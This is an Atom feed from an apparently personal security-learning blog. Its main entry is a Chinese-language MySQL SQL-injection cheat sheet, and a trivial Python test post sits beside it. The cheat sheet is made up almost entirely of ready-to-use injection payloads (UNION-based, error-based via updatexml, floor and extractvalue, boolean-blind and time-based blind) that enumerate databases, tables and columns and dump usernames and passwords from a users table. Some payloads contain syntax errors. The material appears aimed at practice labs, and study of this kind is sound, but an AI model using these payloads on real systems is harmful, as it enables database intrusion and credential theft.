<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Adad456</title>
  
  <subtitle>Learning</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://adad456.github.io/"/>
  <updated>2019-10-17T08:55:27.015Z</updated>
  <id>https://adad456.github.io/</id>
  
  <author>
    <name>Adad456</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>test</title>
    <link href="https://adad456.github.io/2019/10/17/test/"/>
    <id>https://adad456.github.io/2019/10/17/test/</id>
    <published>2019-10-17T08:53:54.000Z</published>
    <updated>2019-10-17T08:55:27.015Z</updated>
    
    <content type="html"><![CDATA[<h3 id="测试一"><a href="#测试一" class="headerlink" title="测试一"></a>测试一</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">print(sys.argv[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><h3 id="测试二"><a href="#测试二" class="headerlink" title="测试二"></a>测试二</h3><h3 id="测试三"><a href="#测试三" class="headerlink" title="测试三"></a>测试三</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;测试一&quot;&gt;&lt;a href=&quot;#测试一&quot; class=&quot;headerlink&quot; title=&quot;测试一&quot;&gt;&lt;/a&gt;测试一&lt;/h3&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;
      
    
    </summary>
    
    
    
      <category term="test" scheme="https://adad456.github.io/tags/test/"/>
    
  </entry>
  
  <entry>
    <title>获取数据库信息</title>
    <link href="https://adad456.github.io/2019/10/17/%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF/"/>
    <id>https://adad456.github.io/2019/10/17/获取数据库信息/</id>
    <published>2019-10-17T08:44:05.000Z</published>
    <updated>2019-10-17T08:52:19.995Z</updated>
    
    <content type="html"><![CDATA[<p><strong>mysql数据库常用函数:</strong></p><pre><code>system_user()系统用户名users()用户名current_user()当前用户名session_user()连接数据库的用户名database() 数据库名version() MYSQL数据库版本@@datadir 读取数据库路径@@basedir MYSQL安装路径@@version_compile_os 操作系统concat(str1,str2,str3),返回str1+str2+str3;当有一个字符串为NULL时，即返回NULLconcat_ws(separator,str1,str2,str3),返回str1+separator+str2+separator+str3group_concat（str1,str2,str3）,返回str1+str2+str3;ascii(a)将a转换成其ASCII值ord(a)将a转换成其ASCII值left(a,b)从左往右截取字符串a的前b个字符substr(a,b,c)从b位置开始，截取字符串a的c长度mid(a,b,c)从位置b开始，截取a字符串的c位regexp、like语句</code></pre><h1 id="UNION-SELECT"><a href="#UNION-SELECT" class="headerlink" title="UNION SELECT"></a>UNION SELECT</h1><p><strong>union用于连接两个或多个select语句，在注入时需要使前一个select语句为错才能将第二个select语句作为最后输出,即id=-1</strong></p><p><em>查询当前数据库：</em></p><pre><code>id=-1&apos; and union select 1,2,database()--+</code></pre><p><em>查询所有数据库：</em></p><pre><code>id=-1&apos; and union select 1,2,group_concat(schema_name) from information_schema.schemata --+</code></pre><p><em>查询表名：</em></p><pre><code>id=-1&apos; and union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</code></pre><p><em>查询列名：</em></p><pre><code>id=-1&apos; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos; --+</code></pre><p><em>查询字段值：</em></p><pre><code>id=-1&apos; union select 1,2,group_concat(id,username,password) from users--+</code></pre><p>#基于报错注入</p><p>##updatexml报错注入</p><p><strong>updatexml(XML_document,XPath_String,new_value)</strong></p><p><em>获取数据库名、版本信息：</em></p><pre><code>id=1&apos; and updatexml(1,concat(0x23,database(),0x23,version(),0x23),1)--+</code></pre><p><em>获取表名：</em></p><pre><code>id=1&apos; and updatexml(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x23),1)--+</code></pre><p><em>获取列名：</em></p><pre><code>id=1&apos; and updatexml(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;),0x23),1)--+</code></pre><p><em>获取表users()中的用户名和密码：</em></p><pre><code>id=1&apos; and updatexml(1,concat(0x23,(select group_concat(username,0x23,password) from security.users)),1)--+</code></pre><p>##floor报错注入</p><p><strong>floor(rand(0)*2)</strong></p><p><em>爆库：</em></p><pre><code>id=1&apos; and (select 1 from (select count(*),concat(0x23,database(),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as y)--+爆库或：id=1&apos; union select 1 from (select count(*),concat(0x23,database(),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as y--+或：id=1&apos; union select 1,2,count(*) from information_schema.columns group by concat(version(),floor(rand(0)*2)) --+</code></pre><p><em>爆表：</em></p><pre><code>id=1&apos; and (select 1 from (select count(*),concat(0x23,(select concat(table_name) from information_schema.tables where table_schema=database() limit 3,1),0x23,floor(rand(0)*2)) as x from information_schema.tables group by y) as a) --+</code></pre><p><em>爆列名：</em></p><pre><code>id=1&apos; and (select 1 from (select count(*),concat(0x23,(select concat(column_name) from information_schema.columns where table_name=&apos;users&apos; limit 5,1),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as a)--+</code></pre><p><em>爆字段值:</em></p><pre><code>id=1&apos; and (select 1 from (select count(*),concat(0x23,(select concat(username,&apos;:&apos;,password) from security.users limit 0,1),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as a)--+</code></pre><p>##extractvalue报错注入</p><p><strong>extractvalue(xml_frag, xpath_expr)</strong></p><p><em>爆库：</em></p><pre><code>id=1&apos; and extractvalue(1,concat_ws(0x23,user(),version(),database(),@@version_compile_os))--+</code></pre><p><em>爆表：</em></p><pre><code>id=1&apos; and extractvalue(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+</code></pre><p><em>爆列名:</em></p><pre><code>id=1&apos; and extractvalue(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;)))--+</code></pre><p><em>爆字段：</em></p><pre><code>id=1&apos; and extractvalue(1,(select group_concat(username,&apos;:&apos;,password) from users))--+</code></pre><p>#盲注</p><p>##基于布尔的盲注</p><pre><code>ascii()返回指定字符串最左侧字符的ascii值count()计算结果集的数量length()返回指定字符串的长度substr(str,pos,len)substring(str,pos,len)返回截取的子字符串</code></pre><p><em>判断数据库名的长度</em></p><pre><code>id=1&apos; and (length(database())&gt;9) --+id=1&apos; and (length(database())=9) --+id=-1&apos; and (length(database())&gt;0) --+</code></pre><p><em>猜数据库名</em></p><pre><code>id=1&apos; and (left(database(),1)=&apos;s&apos;)--+从左到右截取一个字符,s对应的ascii值为115id=1&apos; and ascii(substr(database(),1,1))=115 --+id=1&apos; and ascii(substr(database(),1,1))&lt;115 --+可以使用‘&lt;’，‘&gt;’来判断id=1&apos; and (left(database(),2)=&apos;se&apos;)--+从左到右截取两个字符</code></pre><p><em>猜当前数据库中表的数量</em></p><pre><code>id=1&apos; and 4=(select count(table_name) from information_schema.tables where table_schema=database())--+id=1&apos; and 4=(select count(table_name) from information_schema.tables where table_schema=&apos;security&apos;)--+</code></pre><p><em>猜当前数据库中表名的长度</em></p><pre><code>id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),7,1))--+表名的长度即是7-1=6位，这里的limit是取的第一个数据库id=1&apos; and (length((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1)=6))--+id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 1,1),7,1))--+ 这里的limit是取的第二个数据库id=1&apos; and (length((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 1,1)=8))--+</code></pre><p><em>逐个猜解表名</em></p><pre><code>格式为：ascii(substr(xxx limit null,1),null,1) ,对递增依次猜解id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101 --+对数据库中的第一个表的第一个字符进行ascii的猜解id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=109 --+对数据库中的第一个表的第二个字符进行ascii的猜解</code></pre><p><em>猜表中列的数量</em></p><pre><code>id=1&apos; and (select count(column_name) from information_schema.columns where table_name=&apos;users&apos;)=20 --+</code></pre><p><em>猜列名的长度</em></p><pre><code>id=1&apos; and ascii(substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),2,1)) --+id=1&apos; and length((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1))=2 --+</code></pre><p><em>猜解列名</em></p><pre><code>id=1&apos; and ascii(substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),1,1))=105 --+</code></pre><p><em>猜字段数量</em></p><pre><code>id=1&apos; and (select count(username) from security.users)=13 --+</code></pre><p><em>猜字段长度</em></p><pre><code>id=1&apos; and length((select username from security.users limit 0,1))=4 --+</code></pre><p><em>dump字段的值</em></p><pre><code>id=1&apos; and ascii(substr((select username from security.users limit 0,1),1,1))=67--+id=1&apos; and ascii(substr((select concat(username,&apos;:&apos;,password) from security.users limit 0,1),1,1))=68--+</code></pre><p>##基于时间的盲注</p><p><em>在获取表名、列名以及具体信息时，方法与布尔盲注相同，都是逐个猜解</em></p><pre><code>if(1,2,3)：如果1为True，则执行2，否则执行3sleep(x)：执行延迟x秒ascii(char)：将char转换为对应的ascii码substr(string,start,len)：从string的start位开始截取len个字符Benchmark(x,1)：执行表达式1，x次（会消耗CPU，慎用）</code></pre><p><em>查看信息</em></p><pre><code>id=1&apos; and if(ascii(substr(user(),1,1))=114,sleep(3),1)查看用户名id=1&apos; and if(ascii(substr(database(),1,1))=114,sleep(3),1)查看数据库id=1&apos; and if(ascii(substr(version(),1,1))=114,sleep(3),1)查看数据库版本</code></pre><p><em>爆表名</em></p><pre><code>id=-1&apos; and union select if(ascii(substr(table_name,1,1))&gt;97,sleep(5),1),2,3 from information_schema.tables where table_schema = database() limit 0,1</code></pre><p><em>爆列名</em></p><pre><code>id=-1&apos; and union select if(ascii(substr(column_name,1,1))=105,sleep(5),1),2,3 from information_schema.columns where table_name = &apos;admin&apos; limit 0,1</code></pre><p><em>爆数据</em></p><pre><code>id=-1&apos; and union select if(ascii(substr(user,1,1))=97,sleep(5),1),2,3 from admin limit 0,1</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;mysql数据库常用函数:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;system_user()系统用户名

users()用户名

current_user()当前用户名

session_user()连接数据库的用户名

database() 数据
      
    
    </summary>
    
    
      <category term="web安全 - SQL注入" scheme="https://adad456.github.io/categories/web%E5%AE%89%E5%85%A8-SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="https://adad456.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="数据库" scheme="https://adad456.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
  </entry>
  
</feed>
